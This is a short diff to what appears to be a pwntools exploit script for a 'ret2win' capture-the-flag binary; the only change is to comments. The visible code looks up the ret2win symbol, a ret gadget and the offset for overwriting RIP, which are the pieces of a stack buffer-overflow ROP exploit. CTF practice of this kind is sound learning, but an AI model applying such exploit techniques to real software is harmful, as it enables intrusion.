@@ -28,7 +28,7 @@ def exploit(binary_path):
         # Load the cached gadgets for the binary
         rop = ROP(elf)
 
-        # Get the address of the ret2win function
+        # Get the address of the ret2win() function
         ret2win_addr = elf.symbols["ret2win"]
         log.debug(f"The address of ret2win() is {hex(ret2win_addr)}")
 
@@ -36,7 +36,7 @@ def exploit(binary_path):
         ret = rop.find_gadget(['ret'])[0]
         log.debug(f"The address of ROP gadget ret is {hex(ret)}")
 
-        # Get the offset by calling the find_offset function
+        # Get the offset by calling the find_offset() function
         offset = find_offset(binary_path)
         log.debug(f"The offset calculated to overwrite RIP is {offset} bytes")
 
